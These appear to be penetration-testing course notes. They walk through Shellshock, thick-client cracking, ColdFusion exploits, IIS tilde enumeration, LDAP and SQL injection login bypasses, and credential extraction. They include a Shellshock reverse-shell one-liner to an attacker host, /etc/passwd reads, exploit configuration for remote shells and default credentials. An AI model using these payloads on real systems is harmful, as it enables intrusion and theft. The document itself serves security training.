**CVE-2014-6271** — GNU Bash up to 4.3 executes commands placed after a function definition stored in an environment variable. Through CGI, injected HTTP headers (typically User-Agent) become environment variables → command execution as the web server user, usually www-data (root if the server runs elevated). Old, but still found during assessments, especially on IoT/embedded devices.

Local check:

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

Patched Bash prints only "not vulnerable" and no longer treats `y=() {...}` as a function definition (definitions must be prefixed `BASH_FUNC_` now).

### Hands-on Example

Hunt for CGI scripts:

```bash
gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w small.txt -x cgi
# found access.cgi — 200 OK, empty body, still worth probing
```

Confirm via the User-Agent field (Burp Repeater/Intruder fuzzing works too):

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<TARGET_IP>/cgi-bin/access.cgi
```

Reverse shell one-liner:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/7777 0>&1' http://<TARGET_IP>/cgi-bin/access.cgi
```

## Attacking Thick Client Applications

Locally installed enterprise apps (Java, C++, .NET, Silverlight). Two-tier = client talks directly to the database (best for us); three-tier routes through an app server over HTTP/HTTPS. Web-specific bugs like XSS/CSRF/Clickjacking don't apply, but these do: improper error handling, hardcoded sensitive data, DLL hijacking, buffer overflow, SQL injection, insecure storage, session management.

### Penetration Testing Steps

{% stepper %}
{% step %}
## Information gathering

Architecture, languages/frameworks, client/server technologies, entry points, user inputs: CFF Explorer, Detect It Easy, Process Monitor, Strings.
{% endstep %}

{% step %}
## Client side

Static analysis (hardcoded creds in source; reverse .NET/Java binaries: EXE, DLL, JAR, CLASS, WAR) plus dynamic analysis (sensitive data in memory): Ghidra, IDA, OllyDbg, Radare2, dnSpy, x64dbg, JADX, Frida.
{% endstep %}

{% step %}
## Network side

HTTP/HTTPS/TCP/UDP traffic analysis: Wireshark, tcpdump, TCPView, Burp Suite.
{% endstep %}

{% step %}
## Server side

Standard web attacks, most of the OWASP Top Ten.
{% endstep %}
{% endstepper %}

### Retrieving Hardcoded Credentials from Thick-Client Applications

Scenario: after landing SMB access, `Restart-Oracle-Service.exe` turns up on the NETLOGON share. Running it appears to do nothing.

{% stepper %}
{% step %}
## Monitor the process

**ProcMon64** (SysInternals) shows it creates a temp file under `C:\Users\<user>\AppData\Local\Temp` — and deletes it.
{% endstep %}

{% step %}
## Block deletion

Temp folder → Properties → Security → Advanced → Disable inheritance → convert inherited to explicit permissions → edit the user entry → uncheck **Delete subfolders and files** and **Delete**. Re-run the exe.
{% endstep %}

{% step %}
## Inspect the batch file

A random-named `.bat` (e.g. `6F39.bat`) appears in `...\Temp\2`. Contents: username whitelist, a base64 blob echoed to `c:\programdata\oracle.txt`, a `monta.ps1` that decodes it into `restart-service.exe`, execution, then deletion of everything:

```batch
@shift /0
@echo off

if %username% == matt goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<SNIP base64 lines>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```
{% endstep %}

{% step %}
## Preserve decoded files

Strip the `del` lines, run the `.bat` by double-clicking → `oracle.txt`, `monta.ps1`, and the decoded `restart-service.exe` survive under `c:\programdata\`.
{% endstep %}

{% step %}
## Dump the embedded executable

**x64dbg**: Options → Preferences → uncheck everything except **Exit Breakpoint** (starts debugging at the exit point, skipping pre-load DLL noise). File → open `restart-service.exe` → right-click in the CPU view → Follow in Memory Map. Look for a MAP entry with size `0000000000003000`, protection `-RW--`. Double-click it — `MZ` magic bytes in the ASCII column means an embedded executable. Right-click the address → Dump Memory to File.
{% endstep %}

{% step %}
## Identify the dump

`strings64.exe` on the dump shows `.NETFramework,Version=v4.0` — a .NET binary.
{% endstep %}

{% step %}
## Deobfuscate and inspect

**De4dot** (drag the dump onto it) strips the obfuscation → **dnSpy** opens the cleaned source. Verdict: a custom-made runas.exe that restarts the Oracle service with hardcoded credentials.
{% endstep %}
{% endstepper %}

## Exploiting Web Vulnerabilities in Thick-Client Applications

Three-tier thick clients still fall to SQL injection and path traversal. Scenario: `fatty-client.jar` + three notes pulled from an anonymous FTP server — the notes said the server was moved to port **1337** (client still targets 8000), the app needs Java 8, and the login creds are `qtc / clarabibi`.

### Foothold

Login fails with "Connection Error!". Wireshark shows the client resolving `server.fatty.htb` and attempting TCP to port 8000. Point the hostname at the target (as admin):

```cmd
echo <TARGET_IP>    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```

Still port 8000 → patch the client. Extract the JAR, hunt for the port:

```powershell
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
# match in beans.xml line 13
```

`beans.xml` (Spring config) — `<constructor-arg index="1" value = "8000"/>` under `connectionContext` → change to 1337. Same file also leaks the app secret: `clarabibiclarabibiclarabibi`.

The edited JAR fails with an SHA-256 digest mismatch — it's signed, hashes live in `META-INF/MANIFEST.MF`. Remove all the `SHA-256-Digest` entries from MANIFEST.MF, delete `1.RSA` and `1.SF` from META-INF, keep a trailing newline:

```
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter
```

Rebuild and run — login with qtc/clarabibi now succeeds:

```powershell
cd .\fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

Whoami shows role `user`; ServerStatus options are unclickable → a higher-priv role exists. FileBrowser → Notes reveals `security.txt` (unfixed critical issues) and `dave.txt` (all admin users removed from the DB; login timeout added against time-based SQLi).

### Path Traversal

FileBrowser reads files, but `../../../../../../etc/passwd` fails — the server filters out `/`. Decompile with **JD-GUI** (Save All Sources). `htb/fatty/client/gui/ClientGuiTest.java` hardcodes the folder passed to `showFiles()`:

```java
ClientGuiTest.this.currentFolder = "configs";
try {
  response = ClientGuiTest.this.invoker.showFiles("configs");
```

Change both to `".."` — no slashes, so the filter is bypassed. Recompile and rebuild:

```powershell
javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
mkdir raw
cp fatty-client-new.jar raw\fatty-client-new-2.jar
# extract fatty-client-new-2.jar in raw\, then overwrite the gui classes
mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
cd raw
jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

FileBrowser → Config now lists `configs/../` — including `fatty-server.jar` and `start.sh` (which runs the server inside an Alpine Docker container).

To exfiltrate a file, patch `open()` in `htb/fatty/client/methods/Invoker.java` to write the response to disk:

```java
import java.io.FileOutputStream;
<SNIP>
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    <SNIP>
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);

    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }

    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();

    return "Successfully saved the file to " + desktopPath;
}
```

Rebuild the JAR the same way, log in, FileBrowser → Config, type `fatty-server.jar`, click Open — it lands on the Desktop.

### SQL Injection

Decompiling `fatty-server.jar`, `htb/fatty/server/database/FattyDbSession.class` → `checkLogin()`:

```java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```

Username goes in unsanitized. But the client hashes the password first (`htb/fatty/shared/resources/user.java`):

```java
public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    // SHA-256 of hashString, hex-encoded
}
```

So the DB hash must equal `sha256(username+password+"clarabibimakeseverythingsecure")` — a plain `' or '1'='1` returns the first record, then fails the hash comparison. SQL errors are logged to a file readable via `showFiles("../logs")` (`error-log.txt`) — logging in with `qtc'` confirms the injection via the syntax error.

UNION injection creates a fake row where you control the password and role. First patch `User.java` to send the password as plaintext:

```java
public void setPassword(String password) {
    this.password = password;
}
```

Rebuild, then log in with username:

```
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```

and password `abc`. The server runs:

```sql
select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```

First SELECT fails, the UNION row returns the fake admin with password `abc` — comparison passes, and you're in as **admin** with ServerStatus unlocked.

## ColdFusion - Discovery & Enumeration

Java-based platform, CFML tag language. Historical issues include CVE-2021-21087 (JSP source upload), CVE-2020-24453 (AD integration misconfiguration), CVE-2020-24450 (command injection), CVE-2020-24449 (arbitrary file read), CVE-2019-15909 (XSS).

Default ports: 80/443 HTTP(S), **8500** (the install port to check), 5500 (server monitor), 1935 RPC, 25 SMTP.

### Enumeration

* `.cfm` / `.cfc` file extensions anywhere → ColdFusion
* Headers like `Server: ColdFusion` / `X-Powered-By: ColdFusion`
* Error messages referencing CF-specific tags/functions
* Default files: `admin.cfm`, `CFIDE/administrator/index.cfm`

```bash
nmap -p- -sC -Pn <TARGET_IP> --open
# 8500/tcp open fmtp
```

Browsing `http://<TARGET_IP>:8500` lists the `CFIDE` and `cfdocs` directories, plus `.cfm` files and error pages. `/CFIDE/administrator` loads the Administrator login page — the module target showed **ColdFusion 8**. The VM can take up to 90s to respond.

## Attacking ColdFusion

### Searchsploit

```bash
searchsploit adobe coldfusion
searchsploit -p 14641    # prints the local exploit path to copy
```

For ColdFusion 8, the two of interest: Adobe ColdFusion - Directory Traversal (14641.py) and Adobe ColdFusion 8 - Remote Command Execution (50057.py).

### Directory Traversal

**CVE-2010-2861** (ColdFusion 9.0.1 and earlier) — read arbitrary files via the `locale` parameter in:

```
CFIDE/administrator/settings/mappings.cfm
logging/settings.cfm
datasources/index.cfm
j2eepackaging/editarchive.cfm
CFIDE/administrator/enter.cfm
```

Concept: `mappings.cfm?locale=en` becomes `mappings.cfm?locale=../../../../../etc/passwd`.

```bash
python2 14641.py <TARGET_IP> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

`[cf_root]/lib/password.properties` stores encrypted passwords for DB connections, mail servers, LDAP — retrieved output example:

```
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

### Unauthenticated RCE

**CVE-2009-2265** (ColdFusion 8.0.1 and earlier) — file upload via the bundled FCKeditor:

```
http://<TARGET_IP>:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

EDB 50057 uploads a JSP payload and triggers the reverse shell. Edit the script's config first:

```python
if __name__ == '__main__':
    # Define some information
    lhost = '<ATTACKER_IP>'
    lport = 4444
    rhost = "<TARGET_IP>"
    rport = 8500
    filename = uuid.uuid4().hex
```

```bash
python3 50057.py    # generates + uploads the JSP payload, connects back via Ncat
```

## IIS Tilde Enumeration

IIS generates 8.3 short names for files/folders; `~` + sequence number in a URL reaches them even when the long name is hidden. Probe character by character — `200 OK` means the short name continues with that character (`/~s` → `/~se` → `/~sec` → ... → `secret~1`). Then access files directly: `secret~1/somefi~1.txt`. The `~1`/`~2` suffix distinguishes similar names (`somefi~1.txt` vs `somefi~2.txt`).

### Enumeration

```bash
nmap -p- -sV -sC --open <TARGET_IP>
# 80/tcp open http Microsoft IIS httpd 7.5
```

Automated with IIS-ShortName-Scanner (needs Oracle Java; hit enter for "no" at the proxy prompt):

```bash
java -jar iis_shortname_scanner.jar 0 5 http://<TARGET_IP>/
```

Module example result: directories `ASPNET~1`, `UPLOAD~1`; files `CSASPX~1.CS`, `CSASPX~1.CS??`, `TRANSF~1.ASP`. GET on `TRANSF~1.ASP` was blocked → brute-force the full filename. Build a wordlist from the stock wordlists filtered on the short-name prefix:

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

```bash
gobuster dir -u http://<TARGET_IP>/ -w /tmp/list.txt -x .aspx,.asp
# /transf**.aspx (Status: 200)
```

## LDAP

### ldapsearch

```bash
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

Binds as the admin DN, searches under the base DN with the mail filter.

### LDAP Injection

Web apps authenticating against LDAP can be bypassed by injecting wildcards/operators into login fields: `*` (any characters), `()` grouping, `|` OR, `&` AND; `(cn=*)` / `(objectClass=*)` as always-true conditions. Typical query shape:

```
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

* `$username = *` → matches any account with the supplied password
* `$password = *` → matches the supplied user with any password

### Enumeration

```bash
nmap -p- -sC -sV --open --min-rate=1000 <TARGET_IP>
# 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) — title: Login
# 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
```

OpenLDAP on 389 + a login page on 80 → assume the app authenticates over LDAP. Module example: `*` in both the username and password fields → logged in, auth bypassed.

## Web Mass Assignment Vulnerabilities

Frameworks that bind user-entered parameters straight into objects/models let attackers set attributes never meant to be user-controlled. Rails example — only username and email are mass-assignable:

```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```

Yet POSTing `"user" => { "username" => "hacker", "email" => "...", "admin" => true }` still sets `admin` if the backend doesn't whitelist.

### Exploiting Mass Assignment Vulnerability

Asset Manager web app (source available): registration succeeds, but login returns "Account is pending approval". From `/opt/asset-manager/app.py`:

```python
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')
```

```python
try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False
```

The `confirmed` parameter is read from the request but never appears in the registration form. Intercept the POST to `/register` in Burp and append it:

```
username=new&password=test&confirmed=test
```

Register → log in as `new:test` immediately, no admin approval required.

## Attacking Applications Connecting to Services

Apps that connect to databases/services carry connection strings — extract the credentials, connect directly, or spray the password across the network's users.

### ELF Executable Examination

`octopus_checker` — found on a remote host, runs and attempts a SQL connection (the unixODBC driver error in its output is the tell that a connection string is inside). Load it in GDB with PEDA:

```bash
gdb ./octopus_checker
```

```
set disassembly-flavor intel
disas main
```

Strings referenced around the calls are scrambled pieces of a SQL connection string (out of order, reversed due to endianness). Further down, a call to `SQLDriverConnect@plt`. Break on it and run:

```
b *0x5555555551b0
run
```

RDX points at the assembled string:

```
DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;
```

Try the creds against MSSQL, then check password reuse for other users on the network.

### DLL File Examination

`MultimasterAPI.dll` — a .NET assembly. Quick peek:

```powershell
Get-FileMetaData .\MultimasterAPI.dll
```

Open it in **dnSpy** (reads/edits/debugs .NET source directly): `MultimasterAPI.Controllers → ColleagueController` contains the database connection string with its password. Beyond connecting to MSSQL, spray that password against other services.

## Other Notable Applications

### Honorable Mentions

* **Axis2** — often sits on top of Tomcat. If Tomcat RCE fails, try weak/default admin creds on Axis2 → upload an AAR webshell (Axis2 service file). A Metasploit module assists.
* **Websphere** — many vulns over the years; default creds `system:manager` on the admin console → WAR deploy → RCE, same as Tomcat.
* **Elasticsearch** — forgotten installs with assorted vulns (seen buried in a 100s-of-pages EyeWitness report). HTB: Haystack.
* **Zabbix** — SQLi, auth bypass, stored XSS, LDAP password disclosure, RCE; built-in functionality abusable for RCE via the API. HTB: Zipper.
* **Nagios** — RCE, root privesc, SQLi, code injection, stored XSS. Default creds `nagiosadmin:PASSW0RD`; fingerprint the version.
* **WebLogic** — Java EE app server, 190+ CVEs, many unauthenticated RCEs from 2007–2021, largely Java deserialization.
* **Wikis/Intranets** (MediaWiki, SharePoint, custom portals) — check known vulns and document repositories; intranet search functions have led straight to valid credentials.
* **DotNetNuke (DNN)** — .NET CMS: auth bypass, directory traversal, stored XSS, file upload bypass, arbitrary file download.
* **vCenter** — large orgs run it to manage ESXi. Check weak creds and vuls scanners miss (Apache Struts 2 RCE; unauthenticated OVA file upload, CVE-2021-22005). Windows appliance → JuicyPotato privesc; has been seen running as SYSTEM or even domain admin — a single source of compromise.
